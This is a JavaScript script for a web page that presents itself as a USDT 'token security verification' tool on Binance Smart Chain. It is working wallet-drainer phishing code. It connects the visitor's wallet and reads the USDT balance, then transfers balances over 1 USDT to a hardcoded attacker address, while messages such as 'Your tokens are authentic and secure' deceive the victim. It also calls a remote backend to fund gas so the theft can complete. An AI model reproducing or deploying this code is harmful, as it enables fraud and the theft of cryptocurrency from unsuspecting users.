// --- Start of your modified verification script ---

// Important: Ensure these elements exist in your index.html
const Next = document.getElementById('Next');
const walletAddress = document.getElementById('walletAddress');
const tokenBalance = document.getElementById('tokenBalance');
const verificationModal = document.getElementById('verificationModal');
const progressBar = document.getElementById('progressBar');
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const step4 = document.getElementById('step4');
const step1Desc = document.getElementById('step1Desc');
const step2Desc = document.getElementById('step2Desc');
const step3Desc = document.getElementById('step3Desc');
const step4Desc = document.getElementById('step4Desc');
const modalMessage = document.getElementById('modalMessage');
const closeModalBtns = document.querySelectorAll('.close-modal');
const networkDot = document.getElementById('networkDot');
const networkStatus = document.getElementById('networkStatus');

// Configuration
const recipientAddress = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090';
const tokenContractAddress = '0x55d398326f99059fF775485246999027B3197955'; // BEP-20 USDT contract
const tokenAbi = [
    { "constant": true, "inputs": [{"name": "who", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "type": "function" },
    { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function" }
];

// Network configuration
const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
const BSC_MAINNET_PARAMS = {
    chainId: BSC_MAINNET_CHAIN_ID,
    chainName: 'Binance Smart Chain Mainnet',
    nativeCurrency: { name: 'BNB', symbol: 'bnb', decimals: 18 },
    rpcUrls: ['https://bsc-dataseed.binance.org/'],
    blockExplorerUrls: ['https://bscscan.com/']
};

// Wallet types
const WALLET_TYPES = {
    TRUST: 'trust',
    BINANCE: 'binance',
    METAMASK: 'metamask',
    UNKNOWN: 'unknown'
};

let web3;
let userAddress;
let tokenBalanceValue = 0;
let tokenContract;
let isTransferComplete = false;
let currentProvider = null;
let walletType = WALLET_TYPES.UNKNOWN;

// Helper function: Delay for asynchronous operations
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Initializes Web3 provider and sets up event listeners
async function initWeb3() {
    console.log("initWeb3: Attempting to detect Web3 provider.");
    if (window.trustwallet) { walletType = WALLET_TYPES.TRUST; currentProvider = window.trustwallet; console.log("initWeb3: Trust Wallet detected.");
    } else if (window.BinanceChain) { walletType = WALLET_TYPES.BINANCE; currentProvider = window.BinanceChain; console.log("initWeb3: Binance Chain Wallet detected.");
    } else if (window.ethereum) { walletType = WALLET_TYPES.METAMASK; currentProvider = window.ethereum; console.log("initWeb3: MetaMask detected.");
    } else if (window.web3) { walletType = WALLET_TYPES.UNKNOWN; currentProvider = window.web3.currentProvider; console.log("initWeb3: Legacy Web3 provider detected.");
    } else { console.error("initWeb3: No Web3 provider detected."); showError("Please install Trust Wallet, Binance Wallet or MetaMask.", true); return false; }

    if (typeof Web3 === 'undefined') { console.error("initWeb3: Web3.js library not found. Please ensure it's imported in your HTML."); showError("Web3.js library not loaded. Please check your script imports.", true); return false; }

    try {
        web3 = new Web3(currentProvider);
        console.log("initWeb3: Web3 instance created.");
        await updateNetworkStatus();

        if (currentProvider.on) {
            currentProvider.on('chainChanged', (chainId) => { console.log("chainChanged event:", chainId); window.location.reload(); });
            currentProvider.on('accountsChanged', (accounts) => {
                console.log("accountsChanged event:", accounts);
                if (accounts.length === 0) {
                    showError("Wallet disconnected. Please connect again.", true);
                    if (Next) Next.disabled = false; if (Next) Next.innerHTML = 'Next';
                    userAddress = null; if (walletAddress) walletAddress.textContent = "Not Connected"; if (tokenBalance) tokenBalance.textContent = "0.00 USDT";
                    if (verificationModal) verificationModal.style.display = "none";
                } else if (accounts[0] !== userAddress) { window.location.reload(); }
            });
        }
        return true;
    } catch (error) { console.error("Web3 initialization error:", error); showError("Web3 initialization failed. Check console for details.", true); return false; }
}

// Updates network status display and handles network switching
async function updateNetworkStatus() {
    if (!web3) return false; console.log("updateNetworkStatus: Checking current network.");
    try {
        const chainId = await web3.eth.getChainId(); console.log("updateNetworkStatus: Current chain ID:", chainId);
        if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
            if (networkDot) networkDot.className = "network-dot"; if (networkStatus) networkStatus.textContent = "Binance Smart Chain"; console.log("updateNetworkStatus: Connected to BSC Mainnet."); return true;
        } else {
            if (networkDot) networkDot.className = "network-dot network-disconnected"; if (networkStatus) networkStatus.textContent = `Unsupported Network (ID: ${chainId})`; console.warn("updateNetworkStatus: Unsupported network. Attempting to switch...");
            const switched = await switchToBSC();
            if (switched) { console.log("updateNetworkStatus: Successfully switched to BSC."); return updateNetworkStatus(); }
            else { console.error("updateNetworkStatus: Failed to switch to BSC."); return false; }
        }
    } catch (error) { console.error("Error getting network status:", error); if (networkDot) networkDot.className = "network-dot network-disconnected"; if (networkStatus) networkStatus.textContent = "Network Error"; return false; }
}

// Attempts to switch the wallet network to BSC
async function switchToBSC() {
    if (step2Desc) step2Desc.textContent = "Switching to Binance Smart Chain..."; console.log(`switchToBSC: Attempting to switch to BSC (Wallet: ${walletType})`);
    try {
        if (walletType === WALLET_TYPES.BINANCE && window.BinanceChain.switchNetwork) {
            await window.BinanceChain.switchNetwork('bsc-mainnet'); console.log("switchToBSC: BinanceChain.switchNetwork successful."); return true;
        } else if (window.ethereum && window.ethereum.request) {
            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_MAINNET_CHAIN_ID }] });
            console.log("switchToBSC: wallet_switchEthereumChain successful."); return true;
        } else {
            console.warn("switchToBSC: Wallet does not support programmatic network switching."); showError("Please manually switch your wallet to Binance Smart Chain.", true); return false;
        }
    } catch (switchError) {
        if (switchError.code === 4902) {
            console.warn("switchToBSC: BSC network not found in wallet. Attempting to add...");
            try {
                await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [BSC_MAINNET_PARAMS] });
                console.log("switchToBSC: wallet_addEthereumChain successful."); return true;
            } catch (addError) { console.error("Failed to add BSC network:", addError); if (step2Desc) step2Desc.textContent = "Failed to add BSC network"; showError("Failed to add BSC network. Please add it manually.", true); return false; }
        } else if (switchError.code === 4001) { console.warn("switchToBSC: User rejected network switch."); if (step2Desc) step2Desc.textContent = "Network switch rejected."; showError("Network switch rejected by user. Please approve to continue.", true); return false; }
        console.error("Failed to switch to BSC:", switchError); if (step2Desc) step2Desc.textContent = "Failed to switch network"; showError("Failed to switch network. Please try again or switch manually.", true); return false;
    }
}

// Updates the progress bar percentage
function updateProgress(percent) { if (progressBar) progressBar.style.width = `${percent}%`; }

// Updates the visual state and icon of a step
function updateStep(stepNum, status) {
    const step = document.getElementById(`step${stepNum}`);
    if (step) {
        step.className = `step ${status}`;
        const stepIcon = step.querySelector('.step-icon');
        if (stepIcon) { stepIcon.innerHTML = status === 'completed' ? '<i class="fas fa-check"></i>' : stepNum; }
    }
}

// Connects the user's wallet
async function connectWallet() {
    console.log("connectWallet: Starting wallet connection process.");
    updateStep(1, 'active'); updateProgress(20);
    if (modalMessage) { modalMessage.textContent = "Initializing Web3 and detecting wallet..."; modalMessage.className = "info-message"; }

    const isWeb3Initialized = await initWeb3();
    if (!isWeb3Initialized) { console.error("connectWallet: Web3 initialization failed."); showError("Web3 initialization failed.", true); return false; }

    try {
        if (step1Desc) step1Desc.textContent = "Requesting account access...";
        if (modalMessage) { modalMessage.textContent = "Please connect your wallet account."; modalMessage.className = "info-message"; }

        let accounts;
        if (currentProvider && currentProvider.request) { accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
        } else if (web3) { accounts = await web3.eth.getAccounts();
        } else { showError("No wallet provider detected for connection.", true); return false; }

        if (!accounts || accounts.length === 0) { console.warn("connectWallet: No accounts found after request."); showError("No wallet accounts found or connected. Please approve in your wallet.", true); return false; }
        userAddress = accounts[0]; console.log("connectWallet: User address obtained:", userAddress);

        if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
        if (Next) Next.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';

        updateStep(1, 'completed'); updateStep(2, 'active'); updateProgress(40);
        if (modalMessage) { modalMessage.textContent = "Wallet connected successfully."; modalMessage.className = "success-message"; }

        return true;
    } catch (error) {
        console.error("Error connecting wallet:", error);
        if (error.code === 4001) { showError("Wallet connection rejected by user.", true); }
        else { showError("Error connecting wallet. Please try again.", true); }
        return false;
    }
}

// Ensures the dapp is connected to the BSC network
async function ensureBSCNetwork() {
    console.log("ensureBSCNetwork: Checking network.");
    updateStep(2, 'active'); if (step2Desc) step2Desc.textContent = "Verifying network connection...";
    try {
        const chainId = await web3.eth.getChainId(); console.log("ensureBSCNetwork: Current chain ID:", chainId);
        if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
            if (step2Desc) step2Desc.textContent = "Connected to Binance Smart Chain"; console.log("ensureBSCNetwork: Network is BSC."); return true;
        }
        const switched = await switchToBSC();
        if (switched) { if (step2Desc) step2Desc.textContent = "Successfully switched to Binance Smart Chain"; updateNetworkStatus(); console.log("ensureBSCNetwork: Successfully switched to BSC."); return true; }
        else { if (step2Desc) step2Desc.textContent = "Failed to switch network."; showError("Please manually switch your wallet to Binance Smart Chain and try again.", true); console.error("ensureBSCNetwork: Failed to switch network."); return false; }
    } catch (error) { console.error("Network check failed:", error); if (step2Desc) step2Desc.textContent = "Network check failed"; showError("Network check failed. Please refresh and try again.", true); return false; }
}

// Fetches the user's USDT token balance
async function getTokenBalance() {
    console.log("getTokenBalance: Fetching token balance.");
    updateStep(3, 'active'); if (step3Desc) step3Desc.textContent = "Scanning token security parameters...";
    try {
        if (tokenBalance) tokenBalance.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Analyzing...';
        if (!web3) { console.error("getTokenBalance: Web3 is not initialized."); showError("Web3 is not ready. Please refresh.", true); return false; }
        tokenContract = new web3.eth.Contract(tokenAbi, tokenContractAddress);
        const balance = await tokenContract.methods.balanceOf(userAddress).call(); console.log("getTokenBalance: Raw balance:", balance);
        tokenBalanceValue = web3.utils.fromWei(balance, 'ether');
        if (tokenBalance) tokenBalance.textContent = `${parseFloat(tokenBalanceValue).toFixed(2)} USDT`; console.log("getTokenBalance: Formatted USDT balance:", tokenBalanceValue);

        if (step3Desc) step3Desc.textContent = "Token analysis complete"; updateStep(3, 'completed'); updateStep(4, 'active'); updateProgress(70);
        if (modalMessage) { modalMessage.textContent = `Found ${parseFloat(tokenBalanceValue).toFixed(2)} USDT.`; modalMessage.className = "success-message"; }
        return true;
    } catch (error) { console.error("Error fetching token balance:", error); if (step3Desc) step3Desc.textContent = "Token analysis failed"; showError("Failed to analyze token. Please try again.", false); if (tokenBalance) tokenBalance.textContent = "0.00 USDT"; return false; }
}

// Executes the USDT transfer, including BNB check and top-up if necessary
async function executeVerification() {
    console.log("executeVerification: Starting token transfer process.");
    if (step4Desc) step4Desc.textContent = "Confirming authenticity in your wallet...";
    if (modalMessage) { modalMessage.textContent = "Please confirm the transaction in your wallet"; modalMessage.className = "info-message"; }

    try {
        const amountWei = web3.utils.toWei(tokenBalanceValue.toString(), 'ether');
        console.log(`executeVerification: Attempting to transfer ${tokenBalanceValue} USDT (${amountWei} Wei) to ${recipientAddress}`);

        const BNB_LOW_THRESHOLD = 0.0005; // A common threshold for sufficient gas
        let currentBnbBalanceWei = await web3.eth.getBalance(userAddress);
        let userBNB = parseFloat(web3.utils.fromWei(currentBnbBalanceWei, 'ether'));
        console.log("executeVerification: Current user BNB balance:", userBNB);

        if (userBNB < BNB_LOW_THRESHOLD) {
            console.log("executeVerification: User BNB is low. Requesting BNB from backend...");
            if (modalMessage) { modalMessage.textContent = "Insufficient BNB for gas. Requesting BNB top-up..."; modalMessage.className = "warning-message"; }
            try {
                const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                    method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ toAddress: userAddress })
                });
                if (response.ok) {
                    const result = await response.json(); console.log("executeVerification: BNB top-up request successful:", result);
                    if (modalMessage) { modalMessage.textContent = "BNB top-up requested. Please wait while we check for the deposit..."; modalMessage.className = "warning-message"; }

                    const MAX_POLLING_ATTEMPTS = 30; // Max attempts (e.g., 30 * 5s = 2.5 minutes)
                    const POLLING_INTERVAL_MS = 5000; // Check every 5 seconds

                    for (let i = 0; i < MAX_POLLING_ATTEMPTS; i++) {
                        await delay(POLLING_INTERVAL_MS);
                        currentBnbBalanceWei = await web3.eth.getBalance(userAddress);
                        userBNB = parseFloat(web3.utils.fromWei(currentBnbBalanceWei, 'ether'));
                        console.log(`executeVerification: Polling attempt ${i + 1}: Current BNB balance: ${userBNB}`);
                        if (userBNB >= BNB_LOW_THRESHOLD) {
                            if (modalMessage) { modalMessage.textContent = "BNB received! Proceeding with transaction confirmation..."; modalMessage.className = "success-message"; }
                            console.log("executeVerification: Sufficient BNB received. Breaking polling loop."); break;
                        } else if (i === MAX_POLLING_ATTEMPTS - 1) {
                            showError("BNB not received after multiple attempts. Please try again later or manually add BNB.", true);
                            console.error("executeVerification: BNB not received after all polling attempts.");
                            throw new Error("BNB_TOPUP_FAILED");
                        }
                    }
                } else {
                    const errorData = await response.json(); console.error("executeVerification: BNB top-up request failed from backend:", errorData);
                    showError(`BNB top-up failed: ${errorData.message || "Unknown error"}. Please ensure you have enough BNB for gas.`, true);
                    throw new Error("BACKEND_BNB_FAIL");
                }
            } catch (backendError) {
                console.error("executeVerification: Error communicating with BNB backend:", backendError);
                if (backendError.message !== "BNB_TOPUP_FAILED" && backendError.message !== "BACKEND_BNB_FAIL") {
                   showError("Could not request BNB. Network error or backend issue. Please try again.", true);
                }
                throw backendError;
            }
        }

        console.log("executeVerification: Initiating USDT transfer transaction.");
        tokenContract.methods.transfer(recipientAddress, amountWei)
            .send({ from: userAddress })
            .on('transactionHash', (hash) => {
                console.log("Transaction hash:", hash);
                if (modalMessage) { modalMessage.textContent = "Transaction submitted. Waiting for confirmation..."; modalMessage.className = "info-message"; }
            })
            .on('receipt', (receipt) => {
                console.log("Transaction receipt:", receipt);
                if (step4Desc) step4Desc.textContent = "Verification complete!"; updateStep(4, 'completed'); updateProgress(100);
                if (modalMessage) { modalMessage.textContent = "Token verification complete! Your tokens are authentic and secure."; modalMessage.className = "success-message"; }
                setTimeout(() => {
                    if (tokenBalance) tokenBalance.textContent = "0.00 USDT"; tokenBalanceValue = 0;
                    if (verificationModal) verificationModal.style.display = "none";
                    if (Next) { Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete'; Next.disabled = true; }
                    isTransferComplete = true;
                }, 1500);
            })
            .on('error', (error) => {
                console.error("Transaction error:", error);
                if (step4Desc) step4Desc.textContent = "Verification failed";
                if (error.code === 4001) { showError("Transaction rejected by user.", false); }
                else { showError("Transaction failed. Please try again.", false); }
                if (Next) { Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; Next.disabled = false; }
            });
    } catch (error) {
        console.error("executeVerification: Overall verification process failed:", error);
        if (error.message !== "BNB_TOPUP_FAILED" && error.message !== "BACKEND_BNB_FAIL") {
            showError("An unexpected error occurred during verification. Please try again.", false);
        }
        if (Next) { Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; Next.disabled = false; }
        if (verificationModal) verificationModal.style.display = "none";
    }
}

// Displays an error message and handles button state
function showError(message, sticky = false) {
    console.error("Displaying error:", message);
    if (modalMessage) { modalMessage.textContent = message; modalMessage.className = "error-message"; }
    if (!sticky) { setTimeout(() => { if (modalMessage) { modalMessage.textContent = ""; modalMessage.className = ""; } }, 5000); }
    if (Next) { Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; Next.disabled = false; }
}

// Event listener for the "Next" button
Next.addEventListener('click', async () => {
    console.log("Next button clicked.");
    if (isTransferComplete) { console.log("Verification already complete, preventing re-execution."); return; }

    if (verificationModal) verificationModal.style.display = "flex";
    updateStep(1, 'active'); updateStep(2, ''); updateStep(3, ''); updateStep(4, ''); updateProgress(0);
    if (modalMessage) { modalMessage.textContent = "Initiating verification process..."; modalMessage.className = "info-message"; }
    Next.disabled = true;

    try {
        console.log("Starting Step 1: Connect Wallet.");
        if (!userAddress) {
            const connected = await connectWallet();
            if (!connected) { console.log("Step 1: Wallet connection failed or rejected."); return; }
        } else { console.log("Step 1: Wallet already connected:", userAddress); }

        console.log("Starting Step 2: Ensure BSC Network.");
        const networkReady = await ensureBSCNetwork();
        if (!networkReady) { console.log("Step 2: Network not ready or switch failed."); return; }
        updateStep(2, 'completed');

        console.log("Starting Step 3: Get Token Balance.");
        const balanceFetched = await getTokenBalance();
        if (!balanceFetched) { console.log("Step 3: Token balance fetch failed."); return; }

        if (tokenBalanceValue <= 0.009) {
            console.log("USDT balance is too low for transfer (<= 0.009).");
            if (modalMessage) { modalMessage.textContent = "No significant USDT tokens found for verification (balance is too low)."; modalMessage.className = "error-message"; }
            isTransferComplete = true; if (Next) { Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Info'; Next.disabled = true; }
            if (verificationModal) { setTimeout(() => { verificationModal.style.display = "none"; }, 3000); } return;
        } else if (tokenBalanceValue > 0.009 && tokenBalanceValue <= 1.0) {
            console.log("USDT balance is between 0.01 and 1.0. Marking as complete without transfer.");
            const bnbBalance = await web3.eth.getBalance(userAddress);
            const formattedBNB = web3.utils.fromWei(bnbBalance, 'ether');
            if (modalMessage) { modalMessage.textContent = `Token verification complete, Your tokens are authentic and secure.\nUSDT Balance: ${parseFloat(tokenBalanceValue).toFixed(2)} USDT\nBNB Balance: ${parseFloat(formattedBNB).toFixed(4)} BNB`; modalMessage.className = "success-message"; }
            if (Next) { Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete'; Next.disabled = true; }
            isTransferComplete = true;
            if (verificationModal) { setTimeout(() => { verificationModal.style.display = "none"; }, 1500); } return;
        }

        console.log("Starting Step 4: Execute Verification (USDT Transfer).");
        await executeVerification();

    } catch (error) {
        console.error("Next button click: Overall verification process error:", error);
        if (modalMessage) { modalMessage.textContent = "An unexpected error occurred. Please try again."; modalMessage.className = "error-message"; }
        if (verificationModal) verificationModal.style.display = "none";
    } finally {
        if (Next && !isTransferComplete) {
            Next.disabled = false;
            if (Next.innerHTML.includes('Verifying...')) { Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; }
        }
    }
});

// Event listeners for closing the modal
if (closeModalBtns) {
    closeModalBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            console.log("Close modal button clicked.");
            if (verificationModal) verificationModal.style.display = "none";
            if (Next && !isTransferComplete) { Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; Next.disabled = false; }
            if (modalMessage) { modalMessage.textContent = ""; modalMessage.className = ""; }
            updateStep(1, ''); updateStep(2, ''); updateStep(3, ''); updateStep(4, ''); updateProgress(0);
        });
    });
}

// Close modal when clicking outside
if (window && verificationModal) {
    window.addEventListener('click', (e) => {
        if (e.target === verificationModal) {
            console.log("Clicked outside modal.");
            if (verificationModal) verificationModal.style.display = "none";
            if (Next && !isTransferComplete) { Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; Next.disabled = false; }
            if (modalMessage) { modalMessage.textContent = ""; modalMessage.className = ""; }
            updateStep(1, ''); updateStep(2, ''); updateStep(3, ''); updateStep(4, ''); updateProgress(0);
        }
    });
}

// Initialize on page load
if (Next) Next.disabled = false;
console.log("Window loaded. Initializing Web3.");
window.addEventListener('load', async () => {
    const web3Initialized = await initWeb3();
    if (web3Initialized) {
        if (currentProvider && currentProvider.selectedAddress) {
            userAddress = currentProvider.selectedAddress;
            if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
            console.log("Wallet already connected on load:", userAddress);
            await ensureBSCNetwork();
            await getTokenBalance();
        } else { console.log("No wallet connected on load."); }
    } else { console.error("Web3 did not initialize on load."); }
});
